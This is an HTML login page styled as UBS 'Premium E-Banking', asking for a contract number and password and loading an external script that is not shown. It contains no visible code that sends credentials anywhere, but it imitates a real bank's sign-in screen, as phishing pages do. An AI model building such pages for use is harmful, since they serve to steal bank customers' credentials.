<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
	<title>Login E-Banking | UBS Home</title>
	<meta content="initial-scale=1.0, width=device-width" name="viewport">
	<link rel="stylesheet" href="css/main.css">
	<link href="img/favicon.png" rel="icon">
</head>
<body>
	
<div class="wrapper" style="display: flex; flex-direction: column;">
	<div class="form">
		<div class="title">
			<img src="img/logo.svg">
			<h1>PREMIUM E-BANKING | CUSTOMER AREA</h1>
		</div>
		<form method="post" action="dashboard.html" onsubmit="return validation();">
			<div class="input_wrap">
				<label for="input_text">Contract number (Login ID) :</label>
				<div class="input_field">
					<input type="text" class="input" id="input_text">
				</div>
			</div>
			<div class="input_wrap">
				<label for="input_password">Password :</label>
				<div class="input_field">
					<input type="password" class="input" id="input_password">
				</div>
			</div>
			<div class="input_wrap">
				<span class="error_msg">Incorrect Account ID and password. Try again.</span>
				<input type="submit" id="login_btn" class="btn enabled" value="Login">
			</div>
		</form>
	</div>

	<p class="footer">Â© UBS 1998-2022. All rights reserved.</p>
</div>

<script src="js/app.js"></script>

</body>
</html>
